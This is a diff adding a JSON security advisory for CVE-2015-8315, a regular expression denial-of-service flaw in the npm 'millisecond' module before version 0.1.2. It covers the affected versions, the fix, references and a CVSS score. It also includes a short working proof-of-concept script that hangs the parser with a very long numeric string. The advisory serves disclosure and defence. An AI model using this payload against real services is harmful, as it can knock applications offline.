@@ -1,0 +1,21 @@
+{
+  "id": 59,
+  "created_at": "2015-11-20T18:52:47.394+00:00",
+  "updated_at": "2016-04-20T17:25:25+00:00",
+  "title": "Regular Expression Denial of Service",
+  "author": "Luigi Pinca",
+  "module_name": "milliseconds",
+  "publish_date": "2015-11-20T18:52:47.394+00:00",
+  "cves": [
+    "CVE-2015-8315"
+  ],
+  "vulnerable_versions": "<0.1.2",
+  "patched_versions": ">=0.1.2",
+  "slug": "milliseconds_regular-expression-denial-of-service",
+  "overview": "millisecond is vulnerable to regular expression denial of service (ReDoS) when extremely long version strings are parsed.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\"[1]\n\n## Proof of concept\n```\nvar ms = require('millisecond');\nvar genstr = function (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\") + \" minutea\");\n```",
+  "recommendation": "Update to version 0.1.2 or greater. An alternative would be to limit the input length of the user input before passing it into millisecond to under 10k characters.",
+  "references": "- https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\n- https://github.com/unshiftio/millisecond/pull/4\n",
+  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+  "cvss_score": 5.3,
+  "coordinating_vendor": "^Lift Security"
+}
